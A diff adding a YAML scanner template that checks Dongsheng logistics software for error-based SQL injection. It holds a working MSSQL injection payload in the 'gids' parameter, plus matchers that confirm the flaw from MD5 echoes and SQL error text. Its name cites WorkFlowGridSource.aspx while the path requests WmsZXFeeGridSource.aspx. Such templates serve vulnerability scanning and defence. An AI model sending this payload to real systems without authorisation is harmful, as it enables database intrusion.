@@ -1,0 +1,28 @@
+id: poc-yaml-dongshengsoft-workflowgridsource-aspx-sqli
+info:
+  name: 东胜物流软件 WorkFlowGridSource.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/WMS_ZX/WmsZXFeeGridSource.aspx?read=isout&gids=1')+AND+1234+IN+(SELECT+(sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "SqlException"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
